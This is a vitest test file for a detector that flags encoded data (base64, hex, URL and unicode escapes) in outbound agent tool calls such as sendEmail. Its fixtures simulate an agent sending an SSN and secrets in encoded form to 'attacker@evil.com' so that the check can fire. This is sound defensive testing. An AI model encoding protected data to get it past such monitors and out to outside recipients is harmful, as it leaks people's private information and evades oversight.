/**
 * Tests for Outbound Encoding Detector.
 */

import { describe, it, expect } from 'vitest';
import { detectOutboundEncoding } from '../../src/classifiers/outbound-encoding-detector.js';
import { createSession } from '../../src/engine/session.js';
import type { ToolCallContext } from '../../src/types/context.js';

const OUTBOUND_TOOLS = ['sendEmail', 'postWebhook', 'uploadFile'];

function makeCtx(overrides: Partial<ToolCallContext> = {}): ToolCallContext {
  return {
    turnId: 'turn-002',
    sessionId: 'session-test',
    toolName: 'sendEmail',
    toolArguments: { recipient: 'attacker@evil.com', body: 'plain text data' },
    toolResult: 'sent',
    timestamp: Date.now(),
    ...overrides,
  };
}

function makeSessionWithPII(values: string[] = ['123-45-6789']): ReturnType<typeof createSession> {
  const session = createSession();
  for (const val of values) {
    session.privilegedValues.add(val);
  }
  return session;
}

describe('detectOutboundEncoding', () => {
  describe('fires when encoded content is in outbound args', () => {
    it('should detect base64-encoded payload in outbound arguments', () => {
      const b64 = Buffer.from('SSN: 123-45-6789, Name: John Doe').toString('base64');
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', body: b64 },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.signal).toBe('ENCODED_EXFILTRATION');
      expect(result?.layer).toBe('L3');
      expect(result?.encodingTypes).toContain('base64');
    });

    it('should detect hex-escaped payload in outbound arguments', () => {
      const hexPayload = '\\x53\\x53\\x4e\\x3a\\x20\\x31\\x32\\x33';
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', data: hexPayload },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.encodingTypes).toContain('hex_escape');
    });

    it('should detect URL-encoded payload in outbound arguments', () => {
      const urlEncoded = '%53%53%4e%3a%20%31%32%33%2d%34%35%2d%36%37%38%39';
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', payload: urlEncoded },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.encodingTypes).toContain('url_encoding');
    });

    it('should detect unicode-escaped payload in outbound arguments', () => {
      const unicodePayload = '\\u0053\\u0053\\u004e\\u003a\\u0020\\u0031\\u0032\\u0033';
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', data: unicodePayload },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.encodingTypes).toContain('unicode_escape');
    });

    it('should include a decoded snippet when available', () => {
      const b64 = Buffer.from('secret password 12345').toString('base64');
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', body: b64 },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.decodedSnippet).toBeDefined();
    });

    it('should correlate decoded content to protected values', () => {
      const b64 = Buffer.from('Customer SSN: 123456789').toString('base64');
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', body: b64 },
      });
      const session = makeSessionWithPII(['123-45-6789']);
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.matchedFields).toContain('123-45-6789');
      expect(result?.similarityScore).toBe(1);
    });
  });

  describe('does not fire on benign cases', () => {
    it('should return null for non-outbound tools', () => {
      const b64 = Buffer.from('encoded data').toString('base64');
      const ctx = makeCtx({
        toolName: 'internalProcess',
        toolArguments: { data: b64 },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when L1 was not active (no privileged data)', () => {
      const b64 = Buffer.from('encoded data').toString('base64');
      const ctx = makeCtx({
        toolArguments: { recipient: 'user@example.com', body: b64 },
      });
      const session = createSession(); // no privileged values
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when outbound args contain no encoded content', () => {
      const ctx = makeCtx({
        toolArguments: { recipient: 'user@example.com', body: 'Hello, this is a plain message.' },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when outbound args are empty', () => {
      const ctx = makeCtx({
        toolArguments: {},
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });
  });

  describe('edge cases', () => {
    it('should detect encoding in nested argument values', () => {
      const b64 = Buffer.from('nested secret data for exfiltration payload').toString('base64');
      const ctx = makeCtx({
        toolArguments: {
          recipient: 'attacker@evil.com',
          metadata: { nested: { deep: b64 } },
        },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.encodingTypes).toContain('base64');
    });

    it('should detect multiple encoding types in same outbound call', () => {
      const b64 = Buffer.from('some secret data exfiltrated via base64').toString('base64');
      const hexPayload = '\\x48\\x65\\x6c\\x6c\\x6f';
      const ctx = makeCtx({
        toolArguments: {
          recipient: 'attacker@evil.com',
          body: b64,
          extra: hexPayload,
        },
      });
      const session = makeSessionWithPII();
      const result = detectOutboundEncoding(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result!.encodingTypes.length).toBeGreaterThanOrEqual(2);
    });
  });
});
